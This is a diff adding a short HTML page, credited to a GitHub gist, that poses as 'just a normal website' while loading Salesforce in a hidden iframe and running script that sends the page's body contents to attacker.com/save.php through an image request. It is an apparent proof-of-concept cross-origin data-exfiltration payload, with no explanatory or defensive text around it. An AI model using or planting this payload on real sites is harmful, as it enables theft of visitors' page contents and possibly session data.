@@ -1,0 +1,17 @@
+<!--
+	source:https://gist.github.com/joswr1ght/2f92d4c16eed1c924782
+-->
+<html><head></head>
+<body>
+This is just a normal website...
+<iframe id="if" name="test" height="0" width="0" src="http://www.salesforce.com"></iframe>
+<script>
+document.getElementById("if").style.visibility="hidden";
+window.open("javascript:
+	var i=new Image();
+	i.src='http://attacker.com/save.php?'+document.body.innerHTML;
+	document.body.appendChild(i);
+	");
+</script>
+</body>
+</html>
